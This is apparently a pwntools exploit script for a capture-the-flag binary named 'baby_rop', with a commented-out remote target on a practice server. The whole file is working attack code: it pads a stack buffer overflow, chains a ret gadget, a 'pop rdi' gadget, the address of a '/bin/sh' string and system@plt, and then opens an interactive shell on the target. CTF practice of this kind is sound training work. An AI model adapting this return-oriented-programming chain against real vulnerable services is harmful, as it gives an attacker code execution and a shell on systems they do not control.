#!/usr/bin/python3.6
from pwn import *

filename = './baby_rop'

elf = ELF(filename)
proc = process(filename)
# proc = remote('node3.buuoj.cn', 25573)

main_addr = elf.sym['main']
log.info(f'main={hex(main_addr)}')

system_plt = elf.plt['system']
log.info(f'system={hex(system_plt)}')


# ROPgadget --binary baby_rop --string '/bin/sh'
str_bin_sh = 0x0000000000601048

# ROPgadget --binary baby_rop --only 'pop|ret'
pop_rdi = 0x0000000000400683
ret = 0x0000000000400479
# Ubuntu 18
payload = b'i' * (0x10 + 8) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_plt) + p64(main_addr)

# with open(f'{filename}_input', 'wb') as f:
#   f.write(payload)

proc.recvuntil(b"What's your name?")
proc.sendline(payload)
# proc.recvuntil(b'\n')
proc.interactive()
